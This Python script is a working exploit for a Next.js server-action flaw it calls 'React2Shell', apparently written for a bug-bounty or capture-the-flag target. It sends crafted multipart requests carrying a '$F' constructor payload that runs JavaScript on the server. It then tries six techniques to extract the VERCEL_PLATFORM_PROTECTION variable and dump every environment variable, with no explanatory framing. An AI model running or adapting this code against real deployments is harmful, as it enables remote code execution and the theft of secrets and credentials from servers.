#!/usr/bin/env python3
"""
Exfiltration techniques for React2Shell
"""

import requests
import json
import random
import string

TARGET = "https://nextjs-cve-hackerone.vercel.app"
ACTION_ID = "007138e0bfbdd7fe024391a1251fd5861f0b5145dc"

def exploit_f_reference(code):
    """
    $F Function Reference exploit
    """
    boundary = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))

    payload_0 = f"$F1#{ACTION_ID}#constructor"
    payload_1 = {
        "constructor": {
            "constructor": code
        }
    }

    body = f'------{boundary}\r\n'
    body += 'Content-Disposition: form-data; name="0"\r\n\r\n'
    body += payload_0 + '\r\n'
    body += f'------{boundary}\r\n'
    body += 'Content-Disposition: form-data; name="1"\r\n\r\n'
    body += json.dumps(payload_1) + '\r\n'
    body += f'------{boundary}--\r\n'

    headers = {
        'Next-Action': ACTION_ID,
        'Content-Type': f'multipart/form-data; boundary=----{boundary}',
        'Accept': 'text/x-component',
        'User-Agent': 'Mozilla/5.0'
    }

    try:
        response = requests.post(TARGET, data=body, headers=headers, timeout=15)
        return response
    except Exception as e:
        return None

print("="*70)
print("Exfiltration Techniques")
print("="*70)

# Technique 1: Try to return the env var value directly in the error
print("\n[*] Technique 1: Return value in error")
code1 = """
(() => {
    const val = process.env.VERCEL_PLATFORM_PROTECTION;
    throw new Error('FLAG:' + val);
})()
"""
r1 = exploit_f_reference(code1)
if r1:
    print(f"Status: {r1.status_code}")
    print(f"Response: {r1.text}")

# Technique 2: Use console.log which might appear in response
print("\n[*] Technique 2: Console log")
code2 = """
(() => {
    console.log('VERCEL_PLATFORM_PROTECTION=' + process.env.VERCEL_PLATFORM_PROTECTION);
    return process.env.VERCEL_PLATFORM_PROTECTION;
})()
"""
r2 = exploit_f_reference(code2)
if r2:
    print(f"Status: {r2.status_code}")
    print(f"Response: {r2.text}")

# Technique 3: Try to access process.env directly
print("\n[*] Technique 3: Direct process.env access")
code3 = "JSON.stringify(process.env)"
r3 = exploit_f_reference(code3)
if r3:
    print(f"Status: {r3.status_code}")
    print(f"Response: {r3.text[:500]}")
    if "VERCEL_PLATFORM_PROTECTION" in r3.text:
        print("\n[!!!] FLAG FOUND IN RESPONSE!")
        # Extract it
        import re
        match = re.search(r'VERCEL_PLATFORM_PROTECTION["\']?\s*:\s*["\']?([^",}]+)', r3.text)
        if match:
            print(f"\n[!!!] FLAG: {match.group(1)}")

# Technique 4: Return just the env var
print("\n[*] Technique 4: Return env var directly")
code4 = "process.env.VERCEL_PLATFORM_PROTECTION"
r4 = exploit_f_reference(code4)
if r4:
    print(f"Status: {r4.status_code}")
    print(f"Response: {r4.text}")

# Technique 5: Try Object.keys to see all env vars
print("\n[*] Technique 5: List all env var keys")
code5 = "JSON.stringify(Object.keys(process.env))"
r5 = exploit_f_reference(code5)
if r5:
    print(f"Status: {r5.status_code}")
    print(f"Response: {r5.text[:500]}")

# Technique 6: Use fs to write and read
print("\n[*] Technique 6: Write to file and read")
code6 = """
(() => {
    const fs = require('fs');
    const val = process.env.VERCEL_PLATFORM_PROTECTION;
    fs.writeFileSync('/tmp/flag.txt', val);
    return fs.readFileSync('/tmp/flag.txt', 'utf8');
})()
"""
r6 = exploit_f_reference(code6)
if r6:
    print(f"Status: {r6.status_code}")
    print(f"Response: {r6.text}")

print("\n" + "="*70)
